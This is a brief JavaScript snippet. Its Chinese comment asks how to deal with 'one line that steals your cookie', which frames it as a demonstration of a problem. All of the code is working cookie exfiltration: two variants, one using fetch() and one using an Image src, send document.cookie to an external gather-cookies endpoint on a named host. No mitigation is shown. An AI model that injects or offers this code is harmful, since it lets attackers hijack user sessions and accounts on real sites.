// 一句话偷窃你的cookie ,怎么解决这个问题呢？

fetch(
    "https://test.proxy.xiaoshuogeng.com/gather-cookies?cookies=" +
    encodeURIComponent(document.cookie)
);

// or

new Image(100, 200).setAttribute(
    "src",
    "https://test.proxy.xiaoshuogeng.com/gather-cookies?cookies=" +
    encodeURIComponent(document.cookie)
);
